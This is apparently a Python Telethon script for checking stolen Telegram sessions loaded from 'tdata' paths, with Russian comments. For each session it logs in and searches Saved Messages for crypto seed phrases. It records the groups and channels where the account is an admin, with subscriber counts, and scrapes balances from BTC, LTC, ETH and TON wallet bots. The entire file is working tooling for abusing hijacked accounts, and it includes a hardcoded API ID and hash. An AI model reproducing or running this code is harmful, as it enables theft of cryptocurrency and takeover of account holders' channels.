from asyncio import Semaphore, wait_for, TimeoutError, sleep
from telethon import TelegramClient
from telethon.errors import InvalidBufferError
from telethon.sessions import StringSession
from telethon.tl.types import User, Channel, Chat
from mnemonics import find_mnemonics
from loguru import logger
from xuy import BotBalance, Result, AdminRight, Bot
from results import saver
from re import compile



API_ID = 17463049
API_HASH = "bd4bbac77f54cd096ede52dd2e8e2e50"


bots = [
    Bot('@BTC_CHANGE_BOT', compile(r': ([\d\.,]+) BTC')),
    Bot('@LTC_CHANGE_BOT', compile(r': ([\d\.,]+) LTC')),
    Bot('@ETH_CHANGE_BOT', compile(r': ([\d\.,]+) ETH')),
    Bot('@wallet', compile(r'Toncoin: ([\d\.,]+) TON'))
]



async def check(tdata_path: str, sess: str, sem: Semaphore) -> Result:
    res = Result(tdata_path)

    # Поиск сид фраз
    try: 
        client = TelegramClient(StringSession(sess), API_ID, API_HASH)
        await client.connect()
        me = await client.get_me()

        mnemonics = set()
        try:
            for m in await client.get_messages('me'):
                if not isinstance(m.message, str):
                    continue
                
                for m in find_mnemonics(m.message):
                    logger.success(m)
                    mnemonics.add(m)
        except:
            pass

        logger.info(f'{me.phone} checked')
        res.seeds = mnemonics
        res.is_valid = True
        res.phone = me.phone
    except Exception as e:
        logger.error(f'{e}')
        return res

    # Поиск админ прав.
    try:
        for dg in await client.get_dialogs():
            if not isinstance(dg.entity, (Chat, Channel)):
                continue
            
            if dg.entity.admin_rights:
                try:
                    megagroup = dg.entity.megagroup
                except:
                    megagroup = False
                
                res.admin_rights.append(AdminRight(
                    megagroup,
                    dg.entity.participants_count,
                    dg.entity.title
                ))
                dg_type = 'Group' if megagroup else 'Channel'
                logger.success(f'{dg_type} | {dg.entity.title} | {dg.entity.participants_count} subscribers')
    except Exception as e:
        logger.error(e)

    # Поиск балансов (TODO: пофиксить говнокод)
    try:
        for bot in bots:
            m_count = 0
            async for m in client.iter_messages(bot.peer):
                m_count += 1
                r = bot.check(m.message)
                if not r is None:
                    res.bots[bot] = BotBalance(bot, r)
                    logger.success(f'Balance {r} в {bot.peer}')
                    break
            if bot not in res.bots and m_count > 0:
                res.bots[bot] = BotBalance(bot, None)
            
    except Exception as e:
        logger.error(e)
    
    await saver.save(res)
    return res


async def check_sess(tdata_path: str, sess: str, sem: Semaphore) -> Result:
    async with sem:
        for attemp in range(3):
            try:
                return await wait_for(check(tdata_path, sess, sem), timeout=5.0)
            except TimeoutError:
                await sleep(3)
                continue
        else:
            logger.error('Timeout')
            return Result(tdata_path)